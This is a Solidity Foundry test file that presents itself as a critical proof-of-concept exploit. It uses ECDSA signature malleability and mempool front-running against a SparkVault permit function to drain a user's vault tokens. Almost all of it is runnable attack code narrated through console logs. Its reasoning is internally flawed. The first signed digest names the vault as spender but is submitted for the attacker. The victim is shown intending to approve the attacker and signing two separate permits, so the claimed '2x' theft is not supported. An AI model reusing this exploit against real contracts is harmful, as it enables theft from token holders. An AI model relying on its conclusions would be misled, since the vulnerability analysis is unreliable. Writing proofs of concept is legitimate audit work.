// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SparkVault} from "../src/SparkVault.sol";
import {ERC20Mock} from "openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";

/**
 * @title Double-Spend Attack via Signature Malleability
 * @notice CRITICAL: Attacker can steal 2x the intended amount by exploiting user confusion
 *
 * Attack Flow:
 * 1. Alice signs permit for 100 tokens (nonce=0) and broadcasts
 * 2. Attacker intercepts, creates malleable signature
 * 3. Attacker front-runs with permit(malleable) → grants 100 token allowance (doesn't steal yet)
 * 4. Alice's original tx fails (nonce now 1, signature was for nonce 0)
 * 5. Alice sees failure, thinks "permit didn't work, try again"
 * 6. Alice signs NEW permit for 100 tokens (nonce=1) and broadcasts retry
 * 7. Attacker front-runs retry with transferFrom() → steals 100 tokens from first allowance
 * 8. Alice's retry succeeds → grants attacker ANOTHER 100 token allowance
 * 9. Attacker calls transferFrom() again → steals another 100 tokens
 * 10. Result: Alice loses 200 tokens, thought she only approved 100 once!
 */
contract DoubleSpendAttackPOC is Test {
    SparkVault public vault;
    ERC20Mock public asset;

    address public admin = address(0x1);
    address public alice;
    address public attacker = address(0xBAD);

    uint256 constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    uint256 alicePrivateKey = 0x1111111111111111111111111111111111111111111111111111111111111111;

    function setUp() public {
        asset = new ERC20Mock();
        alice = vm.addr(alicePrivateKey);

        vm.startPrank(admin);
        vault = SparkVault(deployVaultProxy(address(asset), "Spark Vault", "spDAI", admin));
        vault.setDepositCap(type(uint256).max);
        vm.stopPrank();

        // Alice has 10000 tokens in vault
        asset.mint(alice, 10000e18);
        vm.prank(alice);
        asset.approve(address(vault), type(uint256).max);
        vm.prank(alice);
        vault.deposit(10000e18, alice);

        console.log("=== INITIAL STATE ===");
        console.log("Alice's vault balance:", vault.balanceOf(alice) / 1e18, "tokens");
        console.log("Attacker's vault balance:", vault.balanceOf(attacker) / 1e18, "tokens");
        console.log("Alice's nonce:", vault.nonces(alice));
    }

    function deployVaultProxy(address asset_, string memory name_, string memory symbol_, address admin_)
        internal returns (address)
    {
        SparkVault implementation = new SparkVault();
        bytes memory initData = abi.encodeWithSelector(
            SparkVault.initialize.selector, asset_, name_, symbol_, admin_
        );
        address proxy = address(new TransparentProxy(address(implementation), admin_, initData));
        return proxy;
    }

    function test_DoubleSpend_CriticalAttack() public {
        console.log("\n=== DOUBLE-SPEND ATTACK VIA SIGNATURE MALLEABILITY ===\n");

        uint256 deadline = block.timestamp + 1 hours;
        bytes32 permitTypehash = keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );

        // ========== ROUND 1: ALICE'S FIRST PERMIT (GETS FRONT-RUN) ==========

        console.log(">>> ROUND 1: Alice intends to approve attacker for 100 tokens");
        console.log("Alice's current nonce:", vault.nonces(alice));

        // Alice signs permit for 100 tokens
        uint256 nonce1 = vault.nonces(alice);
        bytes32 digest1 = keccak256(abi.encodePacked(
            "\x19\x01",
            vault.DOMAIN_SEPARATOR(),
            keccak256(abi.encode(permitTypehash, alice, vault, 100e18, nonce1, deadline))
        ));

        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(alicePrivateKey, digest1);
        console.log("Alice signs permit and broadcasts to mempool...");

        // Attacker monitors mempool and creates malleable signature
        console.log("\nAttacker sees Alice's tx in mempool!");
        console.log("Attacker crafts DIFFERENT (malleable) signature from original...");
        bytes32 s1Malleable = bytes32(SECP256K1_N - uint256(s1));
        uint8 v1Malleable = v1 == 27 ? 28 : 27;

        // Attacker front-runs with HIGHER GAS - ONLY permit, NO transferFrom yet
        console.log("\n--- ATTACKER'S FRONT-RUN #1 (higher gas) ---");
        console.log("Attacker submits permit with MALLEABLE signature");
        vm.prank(attacker);
        vault.permit(alice, attacker, 100e18, deadline, v1Malleable, r1, s1Malleable);
        console.log("Permit succeeds! Attacker has 100 token allowance");
        console.log("Alice's nonce incremented to:", vault.nonces(alice));
        console.log("Attacker's allowance:", vault.allowance(alice, attacker) / 1e18, "tokens");

        // Alice's original transaction executes but FAILS
        console.log("\n--- ALICE'S ORIGINAL TX (executes after attacker) ---");
        vm.expectRevert("SparkVault/invalid-permit");
        vault.permit(alice, attacker, 100e18, deadline, v1, r1, s1);
        console.log("FAILS with 'invalid-permit'");
        console.log("Alice's tx reverted - she paid gas for nothing!");

        // ========== ALICE'S CONFUSION ==========

        console.log("\n\n=== ALICE CHECKS ETHERSCAN ===");
        console.log("Alice sees: 'Transaction failed - invalid-permit'");
        console.log("Alice thinks: 'My permit didn't work, I need to try again'");
        console.log("Alice is UNAWARE that attacker already has 100 token allowance!");

        // ========== ROUND 2: ALICE RETRIES - ATTACKER EXPLOITS ==========

        console.log("\n\n>>> ROUND 2: Alice retries permit (thinking first failed)");
        console.log("Alice's current nonce:", vault.nonces(alice));
        console.log("Attacker's current allowance:", vault.allowance(alice, attacker) / 1e18, "tokens");

        // Alice signs NEW permit for 100 tokens (with new nonce)
        uint256 nonce2 = vault.nonces(alice);
        bytes32 digest2 = keccak256(abi.encodePacked(
            "\x19\x01",
            vault.DOMAIN_SEPARATOR(),
            keccak256(abi.encode(permitTypehash, alice, attacker, 100e18, nonce2, deadline))
        ));

        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(alicePrivateKey, digest2);
        console.log("Alice signs NEW permit and broadcasts retry...");

        // CRITICAL: Attacker front-runs Alice's retry with transferFrom FIRST
        console.log("\n--- ATTACKER'S FRONT-RUN #2 (exploits existing allowance) ---");
        console.log("Attacker sees Alice's retry in mempool");
        console.log("Attacker front-runs with transferFrom to drain FIRST allowance");
        vm.prank(attacker);
        vault.transferFrom(alice, attacker, 100e18);
        console.log("Attacker steals 100 tokens using first allowance!");
        console.log("Attacker's balance:", vault.balanceOf(attacker) / 1e18, "tokens");
        console.log("Attacker's remaining allowance:", vault.allowance(alice, attacker) / 1e18, "tokens");

        // NOW Alice's retry permit executes (after attacker drained first allowance)
        console.log("\n--- ALICE'S RETRY PERMIT (executes after attacker's transferFrom) ---");
        vault.permit(alice, attacker, 100e18, deadline, v2, r2, s2);
        console.log("Success! Alice thinks: 'Finally, the permit worked!'");
        console.log("Attacker now has FRESH 100 token allowance again");
        console.log("Attacker's new allowance:", vault.allowance(alice, attacker) / 1e18, "tokens");

        // Attacker drains the SECOND allowance
        console.log("\n--- ATTACKER STRIKES AGAIN ---");
        console.log("Attacker immediately calls transferFrom for the SECOND allowance");
        vm.prank(attacker);
        vault.transferFrom(alice, attacker, 100e18);
        console.log("Attacker steals ANOTHER 100 tokens!");

        // ========== FINAL RESULT ==========

        console.log("\n\n=== FINAL RESULT ===");
        console.log("Attacker's final balance:", vault.balanceOf(attacker) / 1e18, "tokens");
        console.log("Alice's final balance:", vault.balanceOf(alice) / 1e18, "tokens");

        assertEq(vault.balanceOf(attacker), 200e18, "Attacker should have stolen 200 tokens");
        assertEq(vault.balanceOf(alice), 9800e18, "Alice should have lost 200 tokens");

        console.log("\n!!! CRITICAL VULNERABILITY EXPLOITED !!!");
        console.log("Alice intended to approve 100 tokens ONCE");
        console.log("Attacker stole 200 tokens (2x the intended amount)!");
        console.log("");
        console.log("Attack Flow:");
        console.log("1. Attacker front-ran with MALLEABLE sig to grant allowance (no steal yet)");
        console.log("2. Alice's original permit tx FAILED (nonce mismatch)");
        console.log("3. Alice retried thinking first permit failed");
        console.log("4. Attacker front-ran retry with transferFrom() - stole 100 from first allowance");
        console.log("5. Alice's retry permit succeeded - gave attacker ANOTHER 100 allowance");
        console.log("6. Attacker called transferFrom() again - stole another 100");
        console.log("");
        console.log("Impact: USER LOSES 2X INTENDED AMOUNT due to malleability confusion!");
    }
}

contract TransparentProxy {
    address private immutable _implementation;
    address private immutable _admin;

    constructor(address implementation_, address admin_, bytes memory initData) {
        _implementation = implementation_;
        _admin = admin_;
        if (initData.length > 0) {
            (bool success, ) = implementation_.delegatecall(initData);
            require(success, "Init failed");
        }
    }

    fallback() external payable {
        address impl = _implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}


